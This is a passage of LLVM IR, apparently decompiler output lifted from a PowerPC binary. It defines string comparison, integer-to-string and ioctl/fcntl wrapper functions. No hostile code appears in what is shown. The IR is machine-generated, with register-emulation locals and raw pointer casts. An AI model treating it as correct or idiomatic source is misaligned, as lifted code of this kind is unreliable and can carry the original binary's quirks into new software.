  uselistorder i32 %v1_1000997c, { 0, 1, 3, 2 }
  uselistorder i32 %tmp15, { 2, 0, 1 }
  uselistorder i32 25, { 3, 4, 8, 0, 1, 2, 5, 6, 7 }
  uselistorder label %dec_label_pc_100099ec, { 1, 0 }
  uselistorder label %dec_label_pc_100099dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100099d8, { 1, 0 }
  uselistorder label %dec_label_pc_100099a8, { 1, 0 }
  uselistorder label %dec_label_pc_100099a4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000997c, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10009a14 = load i8, i8* %arg1, align 1
  %v3_10009a1c = icmp eq i8 %v2_10009a14, 0
  br i1 %v3_10009a1c, label %dec_label_pc_10009a34, label %dec_label_pc_10009a24

dec_label_pc_10009a24:                            ; preds = %entry, %dec_label_pc_10009a24
  %v0_10009a24 = phi i32 [ %v1_10009a24, %dec_label_pc_10009a24 ], [ 0, %entry ]
  %v1_10009a24 = add i32 %v0_10009a24, 1
  %v2_10009a28 = add i32 %v1_10009a24, %tmp
  %v3_10009a28 = inttoptr i32 %v2_10009a28 to i8*
  %v4_10009a28 = load i8, i8* %v3_10009a28, align 1
  %v3_10009a2c = icmp eq i8 %v4_10009a28, 0
  br i1 %v3_10009a2c, label %dec_label_pc_10009a34, label %dec_label_pc_10009a24

dec_label_pc_10009a34:                            ; preds = %dec_label_pc_10009a24, %entry
  %v0_10009a64 = phi i32 [ 0, %entry ], [ %v1_10009a24, %dec_label_pc_10009a24 ]
  %v1_10009a34 = inttoptr i32 %arg2 to i8*
  %v2_10009a34 = load i8, i8* %v1_10009a34, align 1
  %v3_10009a3c = icmp eq i8 %v2_10009a34, 0
  br i1 %v3_10009a3c, label %dec_label_pc_10009a54, label %dec_label_pc_10009a44

dec_label_pc_10009a44:                            ; preds = %dec_label_pc_10009a34, %dec_label_pc_10009a44
  %v0_10009a44 = phi i32 [ %v1_10009a44, %dec_label_pc_10009a44 ], [ 0, %dec_label_pc_10009a34 ]
  %v1_10009a44 = add i32 %v0_10009a44, 1
  %v2_10009a48 = add i32 %v1_10009a44, %arg2
  %v3_10009a48 = inttoptr i32 %v2_10009a48 to i8*
  %v4_10009a48 = load i8, i8* %v3_10009a48, align 1
  %v3_10009a4c = icmp eq i8 %v4_10009a48, 0
  br i1 %v3_10009a4c, label %dec_label_pc_10009a54, label %dec_label_pc_10009a44

dec_label_pc_10009a54:                            ; preds = %dec_label_pc_10009a44, %dec_label_pc_10009a34
  %v1_10009a54 = phi i32 [ 0, %dec_label_pc_10009a34 ], [ %v1_10009a44, %dec_label_pc_10009a44 ]
  %v4_10009a54 = icmp eq i32 %v0_10009a64, %v1_10009a54
  br i1 %v4_10009a54, label %dec_label_pc_10009a64, label %dec_label_pc_10009a5c

dec_label_pc_10009a5c:                            ; preds = %dec_label_pc_10009a70, %dec_label_pc_10009a54
  ret i32 0

dec_label_pc_10009a64:                            ; preds = %dec_label_pc_10009a54
  %v2_10009a6c = icmp eq i32 %v0_10009a64, 0
  br i1 %v2_10009a6c, label %dec_label_pc_10009a8c, label %dec_label_pc_10009a70

dec_label_pc_10009a70:                            ; preds = %dec_label_pc_10009a64, %dec_label_pc_10009a88
  %v0_10009a88 = phi i32 [ %v1_10009a88, %dec_label_pc_10009a88 ], [ %v0_10009a64, %dec_label_pc_10009a64 ]
  %v0_10009a78 = phi i32 [ %v1_10009a7c, %dec_label_pc_10009a88 ], [ %arg2, %dec_label_pc_10009a64 ]
  %v0_10009a70 = phi i32 [ %v1_10009a74, %dec_label_pc_10009a88 ], [ %tmp, %dec_label_pc_10009a64 ]
  %v1_10009a70 = inttoptr i32 %v0_10009a70 to i8*
  %v2_10009a70 = load i8, i8* %v1_10009a70, align 1
  %v1_10009a78 = inttoptr i32 %v0_10009a78 to i8*
  %v2_10009a78 = load i8, i8* %v1_10009a78, align 1
  %v4_10009a80 = icmp eq i8 %v2_10009a70, %v2_10009a78
  br i1 %v4_10009a80, label %dec_label_pc_10009a88, label %dec_label_pc_10009a5c

dec_label_pc_10009a88:                            ; preds = %dec_label_pc_10009a70
  %v1_10009a7c = add i32 %v0_10009a78, 1
  %v1_10009a74 = add i32 %v0_10009a70, 1
  %v1_10009a88 = add i32 %v0_10009a88, -1
  %v2_10009a88 = icmp eq i32 %v1_10009a88, 0
  br i1 %v2_10009a88, label %dec_label_pc_10009a8c, label %dec_label_pc_10009a70

dec_label_pc_10009a8c:                            ; preds = %dec_label_pc_10009a88, %dec_label_pc_10009a64
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10009a88, { 1, 0 }
  uselistorder i32 %v0_10009a70, { 1, 0 }
  uselistorder i32 %v0_10009a78, { 1, 0 }
  uselistorder label %dec_label_pc_10009a70, { 1, 0 }
  uselistorder label %dec_label_pc_10009a44, { 1, 0 }
  uselistorder label %dec_label_pc_10009a24, { 1, 0 }
}

define i32 @util_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10009a94 = load i8, i8* %arg1, align 1
  %v3_10009a9c = icmp eq i8 %v2_10009a94, 0
  br i1 %v3_10009a9c, label %dec_label_pc_10009ab4, label %dec_label_pc_10009aa4

dec_label_pc_10009aa4:                            ; preds = %entry, %dec_label_pc_10009aa4
  %v0_10009aa4 = phi i32 [ %v1_10009aa4, %dec_label_pc_10009aa4 ], [ 0, %entry ]
  %v1_10009aa4 = add i32 %v0_10009aa4, 1
  %v2_10009aa8 = add i32 %v1_10009aa4, %tmp
  %v3_10009aa8 = inttoptr i32 %v2_10009aa8 to i8*
  %v4_10009aa8 = load i8, i8* %v3_10009aa8, align 1
  %v3_10009aac = icmp eq i8 %v4_10009aa8, 0
  br i1 %v3_10009aac, label %dec_label_pc_10009ab4, label %dec_label_pc_10009aa4

dec_label_pc_10009ab4:                            ; preds = %dec_label_pc_10009aa4, %entry
  %v1_10009ad4 = phi i32 [ 0, %entry ], [ %v1_10009aa4, %dec_label_pc_10009aa4 ]
  %v1_10009ab4 = inttoptr i32 %arg2 to i8*
  %v2_10009ab4 = load i8, i8* %v1_10009ab4, align 1
  %v3_10009abc = icmp eq i8 %v2_10009ab4, 0
  br i1 %v3_10009abc, label %dec_label_pc_10009ad4, label %dec_label_pc_10009ac4

dec_label_pc_10009ac4:                            ; preds = %dec_label_pc_10009ab4, %dec_label_pc_10009ac4
  %v0_10009ac4 = phi i32 [ %v1_10009ac4, %dec_label_pc_10009ac4 ], [ 0, %dec_label_pc_10009ab4 ]
  %v1_10009ac4 = add i32 %v0_10009ac4, 1
  %v2_10009ac8 = add i32 %v1_10009ac4, %arg2
  %v3_10009ac8 = inttoptr i32 %v2_10009ac8 to i8*
  %v4_10009ac8 = load i8, i8* %v3_10009ac8, align 1
  %v3_10009acc = icmp eq i8 %v4_10009ac8, 0
  br i1 %v3_10009acc, label %dec_label_pc_10009ad4, label %dec_label_pc_10009ac4

dec_label_pc_10009ad4:                            ; preds = %dec_label_pc_10009ac4, %dec_label_pc_10009ab4
  %v1_10009adc = phi i32 [ 0, %dec_label_pc_10009ab4 ], [ %v1_10009ac4, %dec_label_pc_10009ac4 ]
  %v3_10009ad4 = icmp slt i32 %v1_10009ad4, %arg3
  br i1 %v3_10009ad4, label %dec_label_pc_10009b08, label %dec_label_pc_10009adc

dec_label_pc_10009adc:                            ; preds = %dec_label_pc_10009ad4
  %v3_10009adc = icmp slt i32 %v1_10009adc, %arg3
  %v1_10009ae0 = add i32 %arg3, 1
  br i1 %v3_10009adc, label %dec_label_pc_10009b08, label %dec_label_pc_10009aec

dec_label_pc_10009aec:                            ; preds = %dec_label_pc_10009adc, %dec_label_pc_10009af0
  %v0_10009af8 = phi i32 [ %v1_10009afc, %dec_label_pc_10009af0 ], [ %arg2, %dec_label_pc_10009adc ]
  %v0_10009af0 = phi i32 [ %v1_10009af4, %dec_label_pc_10009af0 ], [ %tmp, %dec_label_pc_10009adc ]
  %v0_10009aec = phi i32 [ %v1_10009aec, %dec_label_pc_10009af0 ], [ %v1_10009ae0, %dec_label_pc_10009adc ]
  %v1_10009aec = add i32 %v0_10009aec, -1
  %v2_10009aec = icmp eq i32 %v1_10009aec, 0
  br i1 %v2_10009aec, label %dec_label_pc_10009b10, label %dec_label_pc_10009af0

dec_label_pc_10009af0:                            ; preds = %dec_label_pc_10009aec
  %v1_10009af0 = inttoptr i32 %v0_10009af0 to i8*
  %v2_10009af0 = load i8, i8* %v1_10009af0, align 1
  %v1_10009af4 = add i32 %v0_10009af0, 1
  %v1_10009af8 = inttoptr i32 %v0_10009af8 to i8*
  %v2_10009af8 = load i8, i8* %v1_10009af8, align 1
  %v1_10009afc = add i32 %v0_10009af8, 1
  %v4_10009b00 = icmp eq i8 %v2_10009af0, %v2_10009af8
  br i1 %v4_10009b00, label %dec_label_pc_10009aec, label %dec_label_pc_10009b08

dec_label_pc_10009b08:                            ; preds = %dec_label_pc_10009af0, %dec_label_pc_10009adc, %dec_label_pc_10009ad4
  ret i32 0

dec_label_pc_10009b10:                            ; preds = %dec_label_pc_10009aec
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10009aec, { 1, 0 }
  uselistorder i32 %v0_10009af0, { 1, 0 }
  uselistorder i32 %v0_10009af8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009aec, { 1, 0 }
  uselistorder label %dec_label_pc_10009ac4, { 1, 0 }
  uselistorder label %dec_label_pc_10009aa4, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp15 = sext i8 %arg1 to i32
  store i32 %tmp15, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v4_10009b18 = icmp eq i32 %arg3, 0
  br i1 %v4_10009b18, label %dec_label_pc_10009bc8, label %dec_label_pc_10009b24

dec_label_pc_10009b24:                            ; preds = %entry
  %v0_10009b24 = load i32, i32* %r3.global-to-local, align 4
  %v3_10009b24 = icmp eq i32 %v0_10009b24, 0
  store i1 %v3_10009b24, i1* %cr6_eq.global-to-local, align 1
  br i1 %v3_10009b24, label %dec_label_pc_10009bd4, label %dec_label_pc_10009b2c

dec_label_pc_10009b2c:                            ; preds = %dec_label_pc_10009b24
  %v2_10009b24 = icmp sgt i32 %v0_10009b24, 0
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10009b2c.not = icmp ne i32 %arg2, 10
  %brmerge = or i1 %v2_10009b24, %v3_10009b2c.not
  br i1 %brmerge, label %dec_label_pc_10009b2c.dec_label_pc_10009b40_crit_edge, label %dec_label_pc_10009c00

dec_label_pc_10009b2c.dec_label_pc_10009b40_crit_edge: ; preds = %dec_label_pc_10009b2c
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_10009b40

dec_label_pc_10009b40:                            ; preds = %dec_label_pc_10009b2c.dec_label_pc_10009b40_crit_edge, %dec_label_pc_10009c00
  %v2_10009b44.pre-phi = phi i32 [ %.pre, %dec_label_pc_10009b2c.dec_label_pc_10009b40_crit_edge ], [ %v2_10009c08, %dec_label_pc_10009c00 ]
  %v0_10009b482 = phi i32 [ %v0_10009b24, %dec_label_pc_10009b2c.dec_label_pc_10009b40_crit_edge ], [ %v1_10009c00, %dec_label_pc_10009c00 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10009b2c.dec_label_pc_10009b40_crit_edge ], [ 1, %dec_label_pc_10009c00 ]
  store i32 %storemerge, i32* @r8, align 4
  store i32 32, i32* %r11.global-to-local, align 4
  store i32 %v2_10009b44.pre-phi, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009b48

dec_label_pc_10009b48:                            ; preds = %dec_label_pc_10009b6c.dec_label_pc_10009b48_crit_edge, %dec_label_pc_10009b40
  %v2_10009b6c = phi i32 [ %v2_10009b6c.pre, %dec_label_pc_10009b6c.dec_label_pc_10009b48_crit_edge ], [ %v2_10009b44.pre-phi, %dec_label_pc_10009b40 ]
  %v1_10009b6c = phi i32 [ %v1_10009b70, %dec_label_pc_10009b6c.dec_label_pc_10009b48_crit_edge ], [ 32, %dec_label_pc_10009b40 ]
  %v1_10009b54 = phi i32 [ %v0_10009b48.pre, %dec_label_pc_10009b6c.dec_label_pc_10009b48_crit_edge ], [ %v0_10009b482, %dec_label_pc_10009b40 ]
  %v2_10009b48 = udiv i32 %v1_10009b54, %arg2
  %v2_10009b4c = mul i32 %v2_10009b48, %arg2
  %v3_10009b50 = icmp ult i32 %v1_10009b54, %arg2
  store i1 %v3_10009b50, i1* %cr6_eq.global-to-local, align 1
  %v2_10009b54 = sub i32 %v1_10009b54, %v2_10009b4c
  store i32 %v2_10009b54, i32* %r9.global-to-local, align 4
  store i32 %v2_10009b48, i32* %r3.global-to-local, align 4
  %tmp20 = icmp slt i32 %v2_10009b54, 10
  %storemerge13.v = select i1 %tmp20, i32 48, i32 55
  %storemerge13 = add i32 %storemerge13.v, %v2_10009b54
  %v0_10009b6c.off0 = trunc i32 %storemerge13 to i8
  store i32 %storemerge13, i32* %r0.global-to-local, align 4
  %v4_10009b6c = add i32 %v2_10009b6c, %v1_10009b6c
  %v5_10009b6c = inttoptr i32 %v4_10009b6c to i8*
  store i8 %v0_10009b6c.off0, i8* %v5_10009b6c, align 1
  %v0_10009b70 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009b70 = add i32 %v0_10009b70, -1
  store i32 %v1_10009b70, i32* %r11.global-to-local, align 4
  %v0_10009b74 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10009b74, label %dec_label_pc_10009b78, label %dec_label_pc_10009b6c.dec_label_pc_10009b48_crit_edge

dec_label_pc_10009b6c.dec_label_pc_10009b48_crit_edge: ; preds = %dec_label_pc_10009b48
  %v0_10009b48.pre = load i32, i32* %r3.global-to-local, align 4
  %v2_10009b6c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009b48

dec_label_pc_10009b78:                            ; preds = %dec_label_pc_10009b48
  %v0_10009b78 = load i32, i32* @r8, align 4
  %v3_10009b78 = icmp eq i32 %v0_10009b78, 0
  br i1 %v3_10009b78, label %dec_label_pc_10009b80, label %dec_label_pc_10009bec

dec_label_pc_10009b80:                            ; preds = %dec_label_pc_10009b78
  store i32 %v0_10009b70, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009b84

dec_label_pc_10009b84:                            ; preds = %dec_label_pc_10009bec, %dec_label_pc_10009b80
  %v1_10009b8c = phi i32 [ %v1_10009b84.pre, %dec_label_pc_10009bec ], [ %v0_10009b70, %dec_label_pc_10009b80 ]
  %v0_10009b84 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009b84 = add i32 %v0_10009b84, %v1_10009b8c
  %v3_10009b84 = inttoptr i32 %v2_10009b84 to i8*
  %v4_10009b84 = load i8, i8* %v3_10009b84, align 1
  %v5_10009b84 = zext i8 %v4_10009b84 to i32
  store i32 %v5_10009b84, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %v2_10009b84, i32* %r11.global-to-local, align 4
  %v3_10009b90 = icmp eq i8 %v4_10009b84, 0
  br i1 %v3_10009b90, label %dec_label_pc_10009ba8, label %dec_label_pc_10009b98

dec_label_pc_10009b98:                            ; preds = %dec_label_pc_10009b84, %dec_label_pc_10009b98
  %v0_10009b98 = phi i32 [ %v1_10009b98, %dec_label_pc_10009b98 ], [ 0, %dec_label_pc_10009b84 ]
  %v1_10009b98 = add i32 %v0_10009b98, 1
  store i32 %v1_10009b98, i32* %r9.global-to-local, align 4
  %v2_10009b9c = add i32 %v1_10009b98, %v2_10009b84
  %v3_10009b9c = inttoptr i32 %v2_10009b9c to i8*
  %v4_10009b9c = load i8, i8* %v3_10009b9c, align 1
  %v5_10009b9c = zext i8 %v4_10009b9c to i32
  store i32 %v5_10009b9c, i32* %r0.global-to-local, align 4
  %v3_10009ba0 = icmp eq i8 %v4_10009b9c, 0
  br i1 %v3_10009ba0, label %dec_label_pc_10009ba8.loopexit, label %dec_label_pc_10009b98

dec_label_pc_10009ba8.loopexit:                   ; preds = %dec_label_pc_10009b98
  %phitmp = add i32 %v0_10009b98, 2
  br label %dec_label_pc_10009ba8

dec_label_pc_10009ba8:                            ; preds = %dec_label_pc_10009ba8.loopexit, %dec_label_pc_10009b84
  %v0_10009ba8 = phi i32 [ %phitmp, %dec_label_pc_10009ba8.loopexit ], [ 1, %dec_label_pc_10009b84 ]
  store i32 %v0_10009ba8, i32* %ctr.global-to-local, align 4
  store i32 %arg3, i32* %r9.global-to-local, align 4
  %v2_10009bb422 = load i8, i8* %v3_10009b84, align 1
  %v3_10009bb423 = zext i8 %v2_10009bb422 to i32
  store i32 %v3_10009bb423, i32* %r0.global-to-local, align 4
  %v1_10009bb824 = add i32 %v2_10009b84, 1
  store i32 %v1_10009bb824, i32* %r11.global-to-local, align 4
  store i8 %v2_10009bb422, i8* %tmp, align 1
  %v0_10009bc026 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bc027 = add i32 %v0_10009bc026, 1
  store i32 %v1_10009bc027, i32* %r9.global-to-local, align 4
  %v0_10009bc428 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009bc429 = add i32 %v0_10009bc428, -1
  store i32 %v1_10009bc429, i32* %ctr.global-to-local, align 4
  %v2_10009bc430 = icmp eq i32 %v1_10009bc429, 0
  br i1 %v2_10009bc430, label %dec_label_pc_10009bc8, label %dec_label_pc_10009bb4.dec_label_pc_10009bb4_crit_edge

dec_label_pc_10009bb4.dec_label_pc_10009bb4_crit_edge: ; preds = %dec_label_pc_10009ba8, %dec_label_pc_10009bb4.dec_label_pc_10009bb4_crit_edge
  %v1_10009bc031 = phi i32 [ %v1_10009bc0, %dec_label_pc_10009bb4.dec_label_pc_10009bb4_crit_edge ], [ %v1_10009bc027, %dec_label_pc_10009ba8 ]
  %v0_10009bb4.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10009bb4 = inttoptr i32 %v0_10009bb4.pre to i8*
  %v2_10009bb4 = load i8, i8* %v1_10009bb4, align 1
  %v3_10009bb4 = zext i8 %v2_10009bb4 to i32
  store i32 %v3_10009bb4, i32* %r0.global-to-local, align 4
  %v1_10009bb8 = add i32 %v0_10009bb4.pre, 1
  store i32 %v1_10009bb8, i32* %r11.global-to-local, align 4
  %v3_10009bbc = inttoptr i32 %v1_10009bc031 to i8*
  store i8 %v2_10009bb4, i8* %v3_10009bbc, align 1
  %v0_10009bc0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bc0 = add i32 %v0_10009bc0, 1
  store i32 %v1_10009bc0, i32* %r9.global-to-local, align 4
  %v0_10009bc4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009bc4 = add i32 %v0_10009bc4, -1
  store i32 %v1_10009bc4, i32* %ctr.global-to-local, align 4
  %v2_10009bc4 = icmp eq i32 %v1_10009bc4, 0
  br i1 %v2_10009bc4, label %dec_label_pc_10009bc8, label %dec_label_pc_10009bb4.dec_label_pc_10009bb4_crit_edge

dec_label_pc_10009bc8:                            ; preds = %dec_label_pc_10009ba8, %dec_label_pc_10009bb4.dec_label_pc_10009bb4_crit_edge, %entry
  store i32 %arg3, i32* %r3.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009b24
  store i32 48, i32* %r0.global-to-local, align 4
  %v4_10009bd8 = add i32 %arg3, 1
  %v5_10009bd8 = inttoptr i32 %v4_10009bd8 to i8*
  store i8 0, i8* %v5_10009bd8, align 1
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v0_10009be4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009be4 = trunc i32 %v0_10009be4 to i8
  store i8 %v1_10009be4, i8* %tmp, align 1
  ret i32 %arg3

dec_label_pc_10009bec:                            ; preds = %dec_label_pc_10009b78
  %v0_10009bec.pre = load i32, i32* @r1, align 4
  %v2_10009bec = add i32 %v0_10009bec.pre, %v1_10009b70
  store i32 %v2_10009bec, i32* %r9.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_10009bf4 = add i32 %v2_10009bec, 8
  %v4_10009bf4 = inttoptr i32 %v3_10009bf4 to i8*
  store i8 45, i8* %v4_10009bf4, align 1
  %v1_10009b84.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009b84

dec_label_pc_10009c00:                            ; preds = %dec_label_pc_10009b2c
  %v1_10009c00 = sub i32 0, %v0_10009b24
  store i32 %v1_10009c00, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r11.global-to-local, align 4
  %v2_10009c08 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10009c08, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009b40

; uselistorder directives
  uselistorder i32 %v2_10009c08, { 1, 0 }
  uselistorder i32 %v1_10009c00, { 1, 0 }
  uselistorder i32 %v1_10009bc4, { 1, 0 }
  uselistorder i32 %v1_10009bc0, { 1, 0 }
  uselistorder i32 %v1_10009b98, { 0, 2, 1 }
  uselistorder i32 %v1_10009b70, { 0, 2, 1 }
  uselistorder i32 %v2_10009b48, { 1, 0 }
  uselistorder i32 %v1_10009b54, { 0, 2, 1 }
  uselistorder i32 %v2_10009b44.pre-phi, { 1, 0 }
  uselistorder i32 %v0_10009b24, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i8* %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 1, 6, 3, 2, 0, 4, 5, 7, 8, 9 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 6, 7, 1, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 45, { 4, 3, 0, 5, 1, 6, 2, 7 }
  uselistorder i32 %arg2, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_10009bc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009bb4.dec_label_pc_10009bb4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009b98, { 1, 0 }
  uselistorder label %dec_label_pc_10009b40, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_10009c28 = icmp eq i32 %arg2, -2143521772
  %v2_10009c3c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_10009c3c, i32* %stack_var_-16, align 4
  br i1 %v4_10009c28, label %dec_label_pc_10009c98, label %dec_label_pc_10009c58

dec_label_pc_10009c58:                            ; preds = %entry
  %v3_10009c58 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_10009c58, label %dec_label_pc_10009c70, label %dec_label_pc_10009c60

dec_label_pc_10009c60:                            ; preds = %dec_label_pc_10009c58
  %v3_10009c64 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10009c64, label %dec_label_pc_10009c8c, label %dec_label_pc_10009cb4

dec_label_pc_10009c70:                            ; preds = %dec_label_pc_10009c58
  %v1_10009c70 = xor i32 %arg2, -2143551488
  %v3_10009c74 = icmp eq i32 %v1_10009c70, 29717
  br i1 %v3_10009c74, label %dec_label_pc_10009ca0, label %dec_label_pc_10009c7c

dec_label_pc_10009c7c:                            ; preds = %dec_label_pc_10009c70
  %v3_10009c80 = icmp eq i32 %v1_10009c70, 29718
  br i1 %v3_10009c80, label %dec_label_pc_10009cac, label %dec_label_pc_10009cb4

dec_label_pc_10009c8c:                            ; preds = %dec_label_pc_10009c60
  store i32 ptrtoint (i32* @global_var_10009c94.471 to i32), i32* @lr, align 4
  %v1_10009c90 = inttoptr i32 %arg3 to i32*
  %v2_10009c90 = call i32 @__GI_tcgetattr(i32* %v1_10009c90)
  store i32 %v2_10009c90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009cec

dec_label_pc_10009c98:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10009ca4

dec_label_pc_10009ca0:                            ; preds = %dec_label_pc_10009c70
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10009ca4

dec_label_pc_10009ca4:                            ; preds = %dec_label_pc_10009cac, %dec_label_pc_10009c98, %dec_label_pc_10009ca0
  store i32 ptrtoint (i32* @global_var_10009ca8.472 to i32), i32* @lr, align 4
  %v0_10009ca4 = call i32 @__GI_tcsetattr()
  store i32 %v0_10009ca4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009cec

dec_label_pc_10009cac:                            ; preds = %dec_label_pc_10009c7c
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10009ca4

dec_label_pc_10009cb4:                            ; preds = %dec_label_pc_10009c7c, %dec_label_pc_10009c60
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %v0_10009cc4 = call i32 @__asm_mfcr()
  store i32 %v0_10009cc4, i32* %r3.global-to-local, align 4
  %v1_10009cc8 = and i32 %v0_10009cc4, 268435456
  %v3_10009cc8 = icmp eq i32 %v1_10009cc8, 0
  br i1 %v3_10009cc8, label %dec_label_pc_10009cec, label %dec_label_pc_10009cd4

dec_label_pc_10009cd4:                            ; preds = %dec_label_pc_10009cb4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_10009ce0 = load i32, i32* @r2, align 4
  %v1_10009ce4 = add i32 %v0_10009ce0, -28672
  %v2_10009ce8 = inttoptr i32 %v1_10009ce4 to i32*
  store i32 %v0_10009cc4, i32* %v2_10009ce8, align 4
  %v0_10009cf8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009cec

dec_label_pc_10009cec:                            ; preds = %dec_label_pc_10009cb4, %dec_label_pc_10009ca4, %dec_label_pc_10009c8c, %dec_label_pc_10009cd4
  %v0_10009cf8 = phi i32 [ %v0_10009cc4, %dec_label_pc_10009cb4 ], [ %v0_10009ca4, %dec_label_pc_10009ca4 ], [ %v2_10009c90, %dec_label_pc_10009c8c ], [ %v0_10009cf8.pre, %dec_label_pc_10009cd4 ]
  ret i32 %v0_10009cf8

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_10009cec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009ca4, { 0, 2, 1 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v1_10009d00 = add i32 %arg2, -12
  %v2_10009d04 = icmp ugt i32 %v1_10009d00, 2
  %v2_10009d14 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_10009d14, i32* %stack_var_-16, align 4
  br i1 %v2_10009d04, label %dec_label_pc_10009d38, label %dec_label_pc_10009d28

dec_label_pc_10009d28:                            ; preds = %entry
  %v0_10009d30 = call i32 @__asm_mfcr()
  br label %dec_label_pc_10009d44

dec_label_pc_10009d38:                            ; preds = %entry
  %v0_10009d40 = call i32 @__asm_mfcr()
  br label %dec_label_pc_10009d44

dec_label_pc_10009d44:                            ; preds = %dec_label_pc_10009d28, %dec_label_pc_10009d38
  %v0_10009d64 = phi i32 [ %v0_10009d40, %dec_label_pc_10009d38 ], [ %v0_10009d30, %dec_label_pc_10009d28 ]
  store i32 %v0_10009d64, i32* %r3.global-to-local, align 4
  %v1_10009d44 = and i32 %v0_10009d64, 268435456
  %v3_10009d44 = icmp eq i32 %v1_10009d44, 0
  br i1 %v3_10009d44, label %dec_label_pc_10009d68, label %dec_label_pc_10009d50

dec_label_pc_10009d50:                            ; preds = %dec_label_pc_10009d44
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_10009d5c = load i32, i32* @r2, align 4
  %v1_10009d60 = add i32 %v0_10009d5c, -28672
  %v2_10009d64 = inttoptr i32 %v1_10009d60 to i32*
  store i32 %v0_10009d64, i32* %v2_10009d64, align 4
  %v0_10009d6c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009d68

dec_label_pc_10009d68:                            ; preds = %dec_label_pc_10009d44, %dec_label_pc_10009d50
  %v0_10009d6c = phi i32 [ %v0_10009d64, %dec_label_pc_10009d44 ], [ %v0_10009d6c.pre, %dec_label_pc_10009d50 ]
  ret i32 %v0_10009d6c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10009d68, { 1, 0 }
  uselistorder label %dec_label_pc_10009d44, { 1, 0 }
}

